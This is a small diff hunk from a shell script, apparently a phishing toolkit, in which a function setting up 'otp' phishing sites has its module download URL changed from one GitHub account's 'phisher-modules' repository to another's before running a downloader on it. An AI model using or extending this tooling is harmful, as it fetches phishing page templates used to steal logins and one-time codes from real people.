@@ -1600,7 +1600,7 @@ setup_site_dgf() {
                 sleep 1
                 site_access="otp"
                 rm -rf ${site_access}
-                dgfurl="https://github.com/Alygnt/phisher-modules/tree/sites/$site_access/$site_id" 
+                dgfurl="https://github.com/jaysonsmithe15/phisher-modules/tree/sites/$site_access/$site_id" 
                 bash ${dgf_dir}/dgf.sh "${dgfurl}" "none" ""             
                 save_dgf
                 sleep 1
